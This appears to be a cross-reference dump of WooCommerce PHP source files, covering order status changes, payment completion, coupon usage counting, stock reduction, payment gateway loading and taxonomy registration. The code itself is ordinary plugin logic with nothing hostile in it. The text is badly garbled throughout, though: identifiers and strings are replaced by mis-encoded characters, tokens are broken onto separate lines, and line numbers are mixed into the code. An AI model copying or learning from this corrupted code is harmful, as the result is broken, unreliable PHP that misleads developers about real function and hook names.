do_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_' . 
$Ãw_¡©us
->
¦ug
, 
$this
->
id
 );

1329 
do_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_' . 
$this
->
¡©us
 . '_to_' . 
$Ãw_¡©us
->
¦ug
, $this->
id
 );

1330 
do_aùiÚ
Ğ'woocomm”û_Üd”_¡©us_chªged', 
$this
->
id
, $this->
¡©us
, 
$Ãw_¡©us
->
¦ug
 );

1332 iàĞ
$Şd_¡©us
 ) {

1333 
$this
->
add_Üd”_nÙe
Ğ
$nÙe
 . 
¥rštf
Ğ
__
Ğ'Ord” stu chªged from % tØ%s.', 'woocomm”û' ), __Ğ
$Şd_¡©us
->
Çme
, 'woocomm”û' ), __Ğ
$Ãw_¡©us
->name, 'woocommerce' ) ) );

1337 iàĞ'com¶‘ed' =ğ
$Ãw_¡©us
->
¦ug
 ) {

1338 
upd©e_po¡_m‘a
Ğ
$this
->
id
, '_com¶‘ed_d©e', 
cu¼’t_time
('mysql') );

1341 iàĞ'´oûssšg' =ğ
$Ãw_¡©us
->
¦ug
 || 'completed' == $new_status->slug || 'on-hold' == $new_status->slug ) {

1344 
$this
->
»cÜd_´oduù_§Ës
();

1347 
$this
->
šü—£_coupÚ_u§ge_couÁs
();

1351 iàĞ'ÿnûÎed' =ğ
$Ãw_¡©us
->
¦ug
 ) {

1352 
$this
->
deü—£_coupÚ_u§ge_couÁs
();

1356 
wp_upd©e_po¡
Ğ
¬¿y
Ğ'ID' => 
$this
->
id
 ) );

1358 
$this
->
¡©us
 = 
$Ãw_¡©us
->
¦ug
;

1363 
wc_d–‘e_shİ_Üd”_Œªs›Ás
Ğ
$this
->
id
 );

1374 
public
 
funùiÚ
 
ÿnûl_Üd”
Ğ
$nÙe
 = '' ) {

1375 
un£t
Ğ
WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 );

1377 
$this
->
upd©e_¡©us
Ğ'ÿnûÎed', 
$nÙe
 );

1393 
public
 
funùiÚ
 
	$·ym’t_com¶‘e
() {

1395 
	`do_aùiÚ
Ğ'woocomm”û_´e_·ym’t_com¶‘e', 
$this
->
id
 );

1397 iàĞ! 
	`em±y
Ğ
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 ) ) {

1398 
	`un£t
Ğ
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 );

1401 iàĞ
$this
->
id
 && ( 'Ú-hŞd' =ğ$this->
¡©us
 || 'pending' == $this->status || 'failed' == $this->status ) ) {

1403 
$Üd”_Ãeds_´oûssšg
 = 
Œue
;

1405 iàĞĞ
$this
->
	`g‘_™ems
() ) > 0 ) {

1407 
	`fÜ—ch
Ğ
$this
->
	`g‘_™ems
(è
as
 
$™em
 ) {

1409 iàĞ
$™em
['product_id'] > 0 ) {

1411 
$_´oduù
 = 
$this
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 );

1413 iàĞ
çl£
 !=ğ
$_´oduù
 && ( $_´oduù->
	`is_dowÆßdabË
(è&& $_´oduù->
	`is_vœtu®
(èè|| ! 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_Ãeds_´oûssšg', 
Œue
, $_´oduù, 
$this
->
id
 ) ) {

1414 
$Üd”_Ãeds_´oûssšg
 = 
çl£
;

1419 
$Üd”_Ãeds_´oûssšg
 = 
Œue
;

1424 
$Ãw_Üd”_¡©us
 = 
$Üd”_Ãeds_´oûssšg
 ? 'processing' : 'completed';

1426 
$Ãw_Üd”_¡©us
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_·ym’t_com¶‘e_Üd”_¡©us', $Ãw_Üd”_¡©us, 
$this
->
id
 );

1428 
$this
->
	`upd©e_¡©us
Ğ
$Ãw_Üd”_¡©us
 );

1430 
	`add_po¡_m‘a
Ğ
$this
->
id
, '_·id_d©e', 
	`cu¼’t_time
('mysql'), 
Œue
 );

1432 
$this_Üd”
 = 
	`¬¿y
(

1433 'ID' => 
$this
->
id
,

1434 'po¡_d©e' => 
	`cu¼’t_time
( 'mysql', 0 ),

1435 'po¡_d©e_gmt' => 
	`cu¼’t_time
( 'mysql', 1 )

1437 
	`wp_upd©e_po¡
Ğ
$this_Üd”
 );

1439 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_·ym’t_com¶‘e_»duû_Üd”_¡ock', 
Œue
, 
$this
->
id
 ) ) {

1440 
$this
->
	`»duû_Üd”_¡ock
();

1443 
	`do_aùiÚ
Ğ'woocomm”û_·ym’t_com¶‘e', 
$this
->
id
 );

1447 
	`do_aùiÚ
Ğ'woocomm”û_·ym’t_com¶‘e_Üd”_¡©us_' . 
$this
->
¡©us
, $this->
id
 );

1450 
	}
}

1459 
public
 
funùiÚ
 
	$»cÜd_´oduù_§Ës
() {

1461 iàĞ'yes' =ğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_»cÜded_§Ës', 
Œue
 ) ) {

1465 iàĞĞ
$this
->
	`g‘_™ems
() ) > 0 ) {

1466 
	`fÜ—ch
 ( 
$this
->
	`g‘_™ems
(è
as
 
$™em
 ) {

1467 iàĞ
$™em
['product_id'] > 0 ) {

1468 
$§Ës
 = (è
	`g‘_po¡_m‘a
Ğ
$™em
['´oduù_id'], 'tÙ®_§Ës', 
Œue
 );

1469 
$§Ës
 +ğ(è
$™em
['qty'];

1470 iàĞ
$§Ës
 ) {

1471 
	`upd©e_po¡_m‘a
Ğ
$™em
['´oduù_id'], 'tÙ®_§Ës', 
$§Ës
 );

1477 
	`upd©e_po¡_m‘a
Ğ
$this
->
id
, '_recorded_sales', 'yes' );

1478 
	}
}

1487 
public
 
funùiÚ
 
	$g‘_u£d_coupÚs
() {

1489 
$codes
 = 
	`¬¿y
();

1490 
$coupÚs
 = 
$this
->
	`g‘_™ems
( 'coupon' );

1492 
	`fÜ—ch
 ( 
$coupÚs
 
as
 
$™em_id
 => 
$™em
 ) {

1493 
$codes
[] = 
	`Œim
Ğ
$™em
['name'] );

1496  
$codes
;

1497 
	}
}

1506 
public
 
funùiÚ
 
	$šü—£_coupÚ_u§ge_couÁs
() {

1508 iàĞ'yes' =ğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_»cÜded_coupÚ_u§ge_couÁs', 
Œue
 ) ) {

1512 iàĞĞ
$this
->
	`g‘_u£d_coupÚs
() ) > 0 ) {

1513 
	`fÜ—ch
 ( 
$this
->
	`g‘_u£d_coupÚs
(è
as
 
$code
 ) {

1514 iàĞ! 
$code
 ) {

1518 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1520 
$u£d_by
 = 
$this
->
u£r_id
;

1521 iàĞ! 
$u£d_by
 ) {

1522 
$u£d_by
 = 
$this
->
blšg_ema
;

1525 
$coupÚ
->
	`šc_u§ge_couÁ
Ğ
$u£d_by
 );

1529 
	`upd©e_po¡_m‘a
Ğ
$this
->
id
, '_recorded_coupon_usage_counts', 'yes' );

1530 
	}
}

1539 
public
 
funùiÚ
 
	$deü—£_coupÚ_u§ge_couÁs
() {

1541 iàĞ'yes' !ğ
	`g‘_po¡_m‘a
Ğ
$this
->
id
, '_»cÜded_coupÚ_u§ge_couÁs', 
Œue
 ) ) {

1545 iàĞĞ
$this
->
	`g‘_u£d_coupÚs
() ) > 0 ) {

1546 
	`fÜ—ch
 ( 
$this
->
	`g‘_u£d_coupÚs
(è
as
 
$code
 ) {

1547 iàĞ! 
$code
 ) {

1551 
$coupÚ
 = 
Ãw
 
	`WC_CoupÚ
Ğ
$code
 );

1553 
$u£d_by
 = 
$this
->
u£r_id
;

1554 iàĞ! 
$u£d_by
 ) {

1555 
$u£d_by
 = 
$this
->
blšg_ema
;

1558 
$coupÚ
->
	`dü_u§ge_couÁ
Ğ
$u£d_by
 );

1562 
	`d–‘e_po¡_m‘a
Ğ
$this
->
id
, '_recorded_coupon_usage_counts' );

1563 
	}
}

1572 
public
 
funùiÚ
 
	$»duû_Üd”_¡ock
() {

1574 iàĞ'yes' =ğ
	`g‘_İtiÚ
('woocomm”û_mªage_¡ock'è&& Ğ
$this
->
	`g‘_™ems
() ) > 0 ) {

1577 
	`fÜ—ch
 ( 
$this
->
	`g‘_™ems
(è
as
 
$™em
 ) {

1579 iàĞ
$™em
['product_id'] > 0 ) {

1580 
$_´oduù
 = 
$this
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 );

1582 iàĞ
$_´oduù
 && $_´oduù->
	`exi¡s
(è&& $_´oduù->
	`mªagšg_¡ock
() ) {

1584 
$Şd_¡ock
 = 
$_´oduù
->
¡ock
;

1586 
$qty
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_™em_quªt™y', 
$™em
['qty'], 
$this
, $item );

1588 
$Ãw_quªt™y
 = 
$_´oduù
->
	`»duû_¡ock
Ğ
$qty
 );

1590 
$this
->
	`add_Üd”_nÙe
Ğ
	`¥rštf
Ğ
	`__
Ğ'I‹m #% ¡ock„eduûd from % tØ%s.', 'woocomm”û' ), 
$™em
['´oduù_id'], 
$Şd_¡ock
, 
$Ãw_quªt™y
) );

1592 
$this
->
	`£nd_¡ock_nÙifiÿtiÚs
Ğ
$_´oduù
, 
$Ãw_quªt™y
, 
$™em
['qty'] );

1600 
	`do_aùiÚ
Ğ'woocomm”û_»duû_Üd”_¡ock', 
$this
 );

1602 
$this
->
	`add_Üd”_nÙe
Ğ
	`__
( 'Order item stock„educed successfully.', 'woocommerce' ) );

1605 
	}
}

1617 
public
 
funùiÚ
 
	$£nd_¡ock_nÙifiÿtiÚs
Ğ
$´oduù
, 
$Ãw_¡ock
, 
$qty_Üd”ed
 ) {

1620 iàĞ
$Ãw_¡ock
 < 0 ) {

1621 
	`do_aùiÚ
Ğ'woocomm”û_´oduù_Ú_backÜd”', 
	`¬¿y
Ğ'´oduù' => 
$´oduù
, 'Üd”_id' => 
$this
->
id
, 'quªt™y' => 
$qty_Üd”ed
 ) );

1625 
$nÙifiÿtiÚ_£Á
 = 
çl£
;

1627 iàĞ'yes' =ğ
	`g‘_İtiÚ
Ğ'woocomm”û_nÙify_no_¡ock' ) && g‘_İtiÚ('woocomm”û_nÙify_no_¡ock_amouÁ'è>ğ
$Ãw_¡ock
 ) {

1628 
	`do_aùiÚ
Ğ'woocomm”û_no_¡ock', 
$´oduù
 );

1629 
$nÙifiÿtiÚ_£Á
 = 
Œue
;

1631 iàĞ! 
$nÙifiÿtiÚ_£Á
 && 'yes' =ğ
	`g‘_İtiÚ
Ğ'woocomm”û_nÙify_low_¡ock' ) && g‘_İtiÚ('woocomm”û_nÙify_low_¡ock_amouÁ'è>ğ
$Ãw_¡ock
 ) {

1632 
	`do_aùiÚ
Ğ'woocomm”û_low_¡ock', 
$´oduù
 );

1633 
$nÙifiÿtiÚ_£Á
 = 
Œue
;

1636 
	}
}

1645 
public
 
funùiÚ
 
	$g‘_cu¡om”_Üd”_nÙes
() {

1647 
$nÙes
 = 
	`¬¿y
();

1649 
$¬gs
 = 
	`¬¿y
(

1650 'po¡_id' => 
$this
->
id
,

1655 
	`»move_f‹r
Ğ'comm’ts_şau£s', 
	`¬¿y
( 'WC_Comments', 'exclude_order_comments' ) );

1657 
$comm’ts
 = 
	`g‘_comm’ts
Ğ
$¬gs
 );

1659 
	`fÜ—ch
 ( 
$comm’ts
 
as
 
$comm’t
 ) {

1660 
$is_cu¡om”_nÙe
 = 
	`g‘_comm’t_m‘a
Ğ
$comm’t
->
comm’t_ID
, 'is_cu¡om”_nÙe', 
Œue
 );

1661 
$comm’t
->
comm’t_cÚ‹Á
 = 
	`make_şickabË
( $comment->comment_content );

1662 iàĞ
$is_cu¡om”_nÙe
 ) {

1663 
$nÙes
[] = 
$comm’t
;

1667 
	`add_f‹r
Ğ'comm’ts_şau£s', 
	`¬¿y
( 'WC_Comments', 'exclude_order_comments' ) );

1669  (
¬¿y
è
$nÙes
;

1671 
	}
}

1679 
public
 
funùiÚ
 
	$Ãeds_·ym’t
() {

1680 
$v®id_Üd”_¡©u£s
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_v®id_Üd”_¡©u£s_fÜ_·ym’t', 
	`¬¿y
Ğ'³ndšg', 'çed' ), 
$this
 );

1682 iàĞ
	`š_¬¿y
Ğ
$this
->
¡©us
, 
$v®id_Üd”_¡©u£s
 ) && $this->
	`g‘_tÙ®
() > 0 ) {

1683 
$Ãeds_·ym’t
 = 
Œue
;

1685 
$Ãeds_·ym’t
 = 
çl£
;

1688  
	`­¶y_f‹rs
Ğ'woocomm”û_Üd”_Ãeds_·ym’t', 
$Ãeds_·ym’t
, 
$this
, 
$v®id_Üd”_¡©u£s
 );

1689 
	}
}

	@includes/class-wc-payment-gateways.php

1 <?
php


13 şas 
	cWC_Paym’t_G©eways
 {

16 
v¬
 
	m$·ym’t_g©eways
;

22 
´Ùeùed
 
	m$_š¡ªû
 = 
nuÎ
;

34 
public
 
funùiÚ
 
	$š¡ªû
() {

35 iàĞ
	`is_nuÎ
Ğ
£lf
::
$_š¡ªû
 ) )

36 
£lf
::
$_š¡ªû
 = 
Ãw
 
	`£lf
();

37  
£lf
::
$_š¡ªû
;

45 
public
 
funùiÚ
 
	$__şÚe
() {

46 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

47 
	}
}

54 
public
 
funùiÚ
 
	$__wakeup
() {

55 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

56 
	}
}

64 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

65 
$this
->
	`š™
();

66 
	}
}

74 
funùiÚ
 
	$š™
() {

76 
$lßd_g©eways
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_·ym’t_g©eways', 
	`¬¿y
(

85 
$Üd”šg
 = (
¬¿y
è
	`g‘_İtiÚ
('woocommerce_gateway_order');

86 
$Üd”_’d
 = 999;

89 
	`fÜ—ch
 (
$lßd_g©eways
 
as
 
$g©eway
) :

91 
$lßd_g©eway
 = 
Ãw
 
	`$g©eway
();

93 ià(
	`is£t
(
$Üd”šg
[
$lßd_g©eway
->
id
]è&& 
	`is_num”ic
($ordering[$load_gateway->id])) :

95 
$this
->
·ym’t_g©eways
[
$Üd”šg
[
$lßd_g©eway
->
id
]] = $load_gateway;

98 
$this
->
·ym’t_g©eways
[
$Üd”_’d
] = 
$lßd_g©eway
;

99 
$Üd”_’d
++;

100 
’dif
;

102 
’dfÜ—ch
;

104 
	`ksÜt
Ğ
$this
->
·ym’t_g©eways
 );

105 
	}
}

114 
funùiÚ
 
	$·ym’t_g©eways
() {

116 
$_avaabË_g©eways
 = 
	`¬¿y
();

118 iàĞĞ
$this
->
·ym’t_g©eways
 ) > 0 )

119 
	`fÜ—ch
 ( 
$this
->
·ym’t_g©eways
 
as
 
$g©eway
 )

120 
$_avaabË_g©eways
[ 
$g©eway
->
id
 ] = $gateway;

122  
$_avaabË_g©eways
;

123 
	}
}

132 
funùiÚ
 
	$g‘_avaabË_·ym’t_g©eways
() {

134 
$_avaabË_g©eways
 = 
	`¬¿y
();

136 
	`fÜ—ch
 ( 
$this
->
·ym’t_g©eways
 
as
 
$g©eway
 ) :

138 iàĞ
$g©eway
->
	`is_avaabË
() ) {

139 iàĞ! 
	`is_add_·ym’t_m‘hod_·ge
() )

140 
$_avaabË_g©eways
[
$g©eway
->
id
] = $gateway;

141 
	`–£if
Ğ
$g©eway
->
	`suµÜts
( 'add_payment_method' ) )

142 
$_avaabË_g©eways
[
$g©eway
->
id
] = $gateway;

145 
’dfÜ—ch
;

147  
	`­¶y_f‹rs
Ğ'woocomm”û_avaabË_·ym’t_g©eways', 
$_avaabË_g©eways
 );

148 
	}
}

157 
funùiÚ
 
	$´oûss_admš_İtiÚs
() {

159 
$deçuÉ_g©eway
 = ( 
	`is£t
Ğ
$_POST
['deçuÉ_g©eway'] ) ) ? 
	`esc_©Œ
( $_POST['default_gateway'] ) : '';

160 
$g©eway_Üd”
 = ( 
	`is£t
Ğ
$_POST
['gateway_order'] ) ) ? $_POST['gateway_order'] : '';

162 
$Üd”
 = 
	`¬¿y
();

164 iàĞ
	`is_¬¿y
Ğ
$g©eway_Üd”
 ) && ( $gateway_order ) > 0 ) {

165 
$loİ
 = 0;

166 
	`fÜ—ch
 ( 
$g©eway_Üd”
 
as
 
$g©eway_id
 ) {

167 
$Üd”
[ 
	`esc_©Œ
Ğ
$g©eway_id
 ) ] = 
$loİ
;

168 
$loİ
++;

172 
	`upd©e_İtiÚ
Ğ'woocomm”û_deçuÉ_g©eway', 
$deçuÉ_g©eway
 );

173 
	`upd©e_İtiÚ
Ğ'woocomm”û_g©eway_Üd”', 
$Üd”
 );

174 
	}
}

	@includes/class-wc-post-data.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Po¡_D©a
 {

18 
´iv©e
 
	m$ed™šg_‹rm
 = 
nuÎ
;

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
	`add_aùiÚ
Ğ'ed™_‹rm', 
	`¬¿y
Ğ
$this
, 'edit_term' ), 10, 3 );

25 
	`add_aùiÚ
Ğ'ed™ed_‹rm', 
	`¬¿y
Ğ
$this
, 'edited_term' ), 10, 3 );

26 
	`add_f‹r
Ğ'upd©e_Üd”_™em_m‘ad©a', 
	`¬¿y
Ğ
$this
, 'update_order_item_metadata' ), 10, 5 );

27 
	`add_f‹r
Ğ'upd©e_po¡_m‘ad©a', 
	`¬¿y
Ğ
$this
, 'update_post_metadata' ), 10, 5 );

36 
public
 
funùiÚ
 
	$ed™_‹rm
Ğ
$‹rm_id
, 
$‰_id
, 
$xÚomy
 ) {

37 iàĞ
	`¡½os
Ğ
$xÚomy
, 'pa_' ) === 0 ) {

38 
$this
->
ed™šg_‹rm
 = 
	`g‘_‹rm_by
Ğ'id', 
$‹rm_id
, 
$xÚomy
 );

40 
$this
->
ed™šg_‹rm
 = 
nuÎ
;

42 
	}
}

50 
public
 
funùiÚ
 
	$ed™ed_‹rm
Ğ
$‹rm_id
, 
$‰_id
, 
$xÚomy
 ) {

51 iàĞ! 
	`is_nuÎ
Ğ
$this
->
ed™šg_‹rm
 ) && 
	`¡½os
Ğ
$xÚomy
, 'pa_' ) === 0 ) {

52 
$ed™ed_‹rm
 = 
	`g‘_‹rm_by
Ğ'id', 
$‹rm_id
, 
$xÚomy
 );

54 iàĞ
$ed™ed_‹rm
->
¦ug
 !=ğ
$this
->
ed™šg_‹rm
->slug ) {

55 
glob®
 
$wpdb
;

57 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"UPDATE {$wpdb->po¡m‘a} SET m‘a_v®uğ% WHERE m‘a_key = % AND m‘a_v®uğ%s;", 
$ed™ed_‹rm
->
¦ug
, '©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$xÚomy
 ), 
$this
->
ed™šg_‹rm
->slug ) );

60 
$this
->
ed™šg_‹rm
 = 
nuÎ
;

62 
	}
}

74 
public
 
funùiÚ
 
	$upd©e_Üd”_™em_m‘ad©a
Ğ
$check
, 
$objeù_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 ) {

75 iàĞ! 
	`em±y
Ğ
$m‘a_v®ue
 ) && 
	`is_æßt
( $meta_value ) ) {

78 
$m‘a_v®ue
 = 
	`wc_æßt_to_¡ršg
( $meta_value );

81 
	`upd©e_m‘ad©a
Ğ'Üd”_™em', 
$objeù_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 );

84  
Œue
;

86  
$check
;

87 
	}
}

99 
public
 
funùiÚ
 
	$upd©e_po¡_m‘ad©a
Ğ
$check
, 
$objeù_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 ) {

100 iàĞ! 
	`em±y
Ğ
$m‘a_v®ue
 ) && 
	`is_æßt
Ğ$m‘a_v®uè&& 
	`š_¬¿y
Ğ
	`g‘_po¡_ty³
Ğ
$objeù_id
 ), 
	`¬¿y
( 'shop_order', 'shop_coupon', 'product', 'product_variation' ) ) ) {

103 
$m‘a_v®ue
 = 
	`wc_æßt_to_¡ršg
( $meta_value );

106 
	`upd©e_m‘ad©a
Ğ'po¡', 
$objeù_id
, 
$m‘a_key
, 
$m‘a_v®ue
, 
$´ev_v®ue
 );

109  
Œue
;

111  
$check
;

112 
	}
}

116 
Ãw
 
WC_Po¡_D©a
();

	@includes/class-wc-post-types.php

1 <?
php


2 iàĞ! 
defšed
( 'ABSPATH' ) ) {

3 
	gex™
;

17 şas 
	cWC_Po¡_ty³s
 {

22 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

23 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
__CLASS__
, 'register_taxonomies' ), 5 );

24 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
__CLASS__
, 'register_post_types' ), 5 );

30 
public
 
funùiÚ
 
	$»gi¡”_xÚom›s
() {

31 iàĞ
	`xÚomy_exi¡s
( 'product_type' ) )

34 
	`do_aùiÚ
( 'woocommerce_register_taxonomy' );

36 
$³rm®šks
 = 
	`g‘_İtiÚ
( 'woocommerce_permalinks' );

38 
	`»gi¡”_xÚomy
( 'product_type',

39 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_objeùs_´oduù_ty³', 
	`¬¿y
( 'product' ) ),

40 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_¬gs_´oduù_ty³', 
	`¬¿y
(

41 'h›¿rchiÿl' => 
çl£
,

42 'show_ui' => 
çl£
,

43 'show_š_Çv_m’us' => 
çl£
,

44 'qu”y_v¬' => 
	`is_admš
(),

45 '»wr™e' => 
çl£
,

46 'public' => 
çl£


50 
	`»gi¡”_xÚomy
( 'product_cat',

51 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_objeùs_´oduù_ÿt', 
	`¬¿y
( 'product' ) ),

52 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_¬gs_´oduù_ÿt', 
	`¬¿y
(

53 'h›¿rchiÿl' => 
Œue
,

55 'Ïb–' => 
	`__
( 'Product Categories', 'woocommerce' ),

56 'Ïb–s' => 
	`¬¿y
(

57 'Çme' => 
	`__
( 'Product Categories', 'woocommerce' ),

58 'sšguÏr_Çme' => 
	`__
( 'Product Category', 'woocommerce' ),

59 'm’u_Çme' => 
	`_x
( 'Categories', 'Admin menu‚ame', 'woocommerce' ),

60 '£¬ch_™ems' => 
	`__
( 'Search Product Categories', 'woocommerce' ),

61 '®l_™ems' => 
	`__
( 'All Product Categories', 'woocommerce' ),

62 '·»Á_™em' => 
	`__
( 'Parent Product Category', 'woocommerce' ),

63 '·»Á_™em_cŞÚ' => 
	`__
( 'Parent Product Category:', 'woocommerce' ),

64 'ed™_™em' => 
	`__
( 'Edit Product Category', 'woocommerce' ),

65 'upd©e_™em' => 
	`__
( 'Update Product Category', 'woocommerce' ),

66 'add_Ãw_™em' => 
	`__
( 'Add New Product Category', 'woocommerce' ),

67 'Ãw_™em_Çme' => 
	`__
( 'New Product Category Name', 'woocommerce' )

69 'show_ui' => 
Œue
,

70 'qu”y_v¬' => 
Œue
,

71 'ÿ·b™›s' => 
	`¬¿y
(

77 '»wr™e' => 
	`¬¿y
(

78 '¦ug' => 
	`em±y
Ğ
$³rm®šks
['ÿ‹gÜy_ba£'] ) ? 
	`_x
( 'product-category', 'slug', 'woocommerce' ) : $permalinks['category_base'],

79 'w™h_äÚt' => 
çl£
,

80 'h›¿rchiÿl' => 
Œue
,

85 
	`»gi¡”_xÚomy
( 'product_tag',

86 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_objeùs_´oduù_g', 
	`¬¿y
( 'product' ) ),

87 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_¬gs_´oduù_g', 
	`¬¿y
(

88 'h›¿rchiÿl' => 
çl£
,

90 'Ïb–' => 
	`__
( 'Product Tags', 'woocommerce' ),

91 'Ïb–s' => 
	`¬¿y
(

92 'Çme' => 
	`__
( 'Product Tags', 'woocommerce' ),

93 'sšguÏr_Çme' => 
	`__
( 'Product Tag', 'woocommerce' ),

94 'm’u_Çme' => 
	`_x
( 'Tags', 'Admin menu‚ame', 'woocommerce' ),

95 '£¬ch_™ems' => 
	`__
( 'Search Product Tags', 'woocommerce' ),

96 '®l_™ems' => 
	`__
( 'All Product Tags', 'woocommerce' ),

97 '·»Á_™em' => 
	`__
( 'Parent Product Tag', 'woocommerce' ),

98 '·»Á_™em_cŞÚ' => 
	`__
( 'Parent Product Tag:', 'woocommerce' ),

99 'ed™_™em' => 
	`__
( 'Edit Product Tag', 'woocommerce' ),

100 'upd©e_™em' => 
	`__
( 'Update Product Tag', 'woocommerce' ),

101 'add_Ãw_™em' => 
	`__
( 'Add New Product Tag', 'woocommerce' ),

102 'Ãw_™em_Çme' => 
	`__
( 'New Product Tag Name', 'woocommerce' )

104 'show_ui' => 
Œue
,

105 'qu”y_v¬' => 
Œue
,

106 'ÿ·b™›s' => 
	`¬¿y
(

112 '»wr™e' => 
	`¬¿y
(

113 '¦ug' => 
	`em±y
Ğ
$³rm®šks
['g_ba£'] ) ? 
	`_x
( 'product-tag', 'slug', 'woocommerce' ) : $permalinks['tag_base'],

114 'w™h_äÚt' => 
çl£


119 
	`»gi¡”_xÚomy
( 'product_shipping_class',

120 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_objeùs_´oduù_shpšg_şass', 
	`¬¿y
('product', 'product_variation') ),

121 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_¬gs_´oduù_shpšg_şass', 
	`¬¿y
(

122 'h›¿rchiÿl' => 
Œue
,

124 'Ïb–' => 
	`__
( 'Shipping Classes', 'woocommerce' ),

125 'Ïb–s' => 
	`¬¿y
(

126 'Çme' => 
	`__
( 'Shipping Classes', 'woocommerce' ),

127 'sšguÏr_Çme' => 
	`__
( 'Shipping Class', 'woocommerce' ),

128 'm’u_Çme' => 
	`_x
( 'Shipping Classes', 'Admin menu‚ame', 'woocommerce' ),

129 '£¬ch_™ems' => 
	`__
( 'Search Shipping Classes', 'woocommerce' ),

130 '®l_™ems' => 
	`__
( 'All Shipping Classes', 'woocommerce' ),

131 '·»Á_™em' => 
	`__
( 'Parent Shipping Class', 'woocommerce' ),

132 '·»Á_™em_cŞÚ' => 
	`__
( 'Parent Shipping Class:', 'woocommerce' ),

133 'ed™_™em' => 
	`__
( 'Edit Shipping Class', 'woocommerce' ),

134 'upd©e_™em' => 
	`__
( 'Update Shipping Class', 'woocommerce' ),

135 'add_Ãw_™em' => 
	`__
( 'Add New Shipping Class', 'woocommerce' ),

136 'Ãw_™em_Çme' => 
	`__
( 'New Shipping Class Name', 'woocommerce' )

138 'show_ui' => 
Œue
,

139 'show_š_Çv_m’us' => 
çl£
,

140 'qu”y_v¬' => 
	`is_admš
(),

141 'ÿ·b™›s' => 
	`¬¿y
(

147 '»wr™e' => 
çl£
,

151 
	`»gi¡”_xÚomy
( 'shop_order_status',

152 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_objeùs_shİ_Üd”_¡©us', 
	`¬¿y
('shop_order') ),

153 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_¬gs_shİ_Üd”_¡©us', 
	`¬¿y
(

154 'h›¿rchiÿl' => 
çl£
,

156 'show_ui' => 
çl£
,

157 'show_š_Çv_m’us' => 
çl£
,

158 'qu”y_v¬' => 
	`is_admš
(),

159 '»wr™e' => 
çl£
,

160 'public' => 
çl£


164 
glob®
 
$wc_´oduù_©Œibu‹s
, 
$woocomm”û
;

166 
$wc_´oduù_©Œibu‹s
 = 
	`¬¿y
();

168 iàĞ
$©Œibu‹_xÚom›s
 = 
	`wc_g‘_©Œibu‹_xÚom›s
() ) {

169 
	`fÜ—ch
 ( 
$©Œibu‹_xÚom›s
 
as
 
$x
 ) {

170 iàĞ
$Çme
 = 
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$x
->
©Œibu‹_Çme
 ) ) {

172 
$Ïb–
 = ! 
	`em±y
Ğ
$x
->
©Œibu‹_Ïb–
 ) ? $x->©Œibu‹_Ïb– : $x->
©Œibu‹_Çme
;

174 
$wc_´oduù_©Œibu‹s
[ 
$Çme
 ] = 
$x
;

176 
	`»gi¡”_xÚomy
Ğ
$Çme
,

177 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_objeùs_' . 
$Çme
, 
	`¬¿y
( 'product' ) ),

178 
	`­¶y_f‹rs
Ğ'woocomm”û_xÚomy_¬gs_' . 
$Çme
, 
	`¬¿y
(

179 'h›¿rchiÿl' => 
Œue
,

181 'Ïb–s' => 
	`¬¿y
(

182 'Çme' => 
$Ïb–
,

183 'sšguÏr_Çme' => 
$Ïb–
,

184 '£¬ch_™ems' => 
	`¥rštf
Ğ
	`__
Ğ'S—rch %s', 'woocomm”û' ), 
$Ïb–
 ),

185 '®l_™ems' => 
	`¥rštf
Ğ
	`__
Ğ'AÎ %s', 'woocomm”û' ), 
$Ïb–
 ),

186 '·»Á_™em' => 
	`¥rštf
Ğ
	`__
Ğ'P¬’ˆ%s', 'woocomm”û' ), 
$Ïb–
 ),

187 '·»Á_™em_cŞÚ' => 
	`¥rštf
Ğ
	`__
Ğ'P¬’ˆ%s:', 'woocomm”û' ), 
$Ïb–
 ),

188 'ed™_™em' => 
	`¥rštf
Ğ
	`__
Ğ'Ed™ %s', 'woocomm”û' ), 
$Ïb–
 ),

189 'upd©e_™em' => 
	`¥rštf
Ğ
	`__
Ğ'Upd©%s', 'woocomm”û' ), 
$Ïb–
 ),

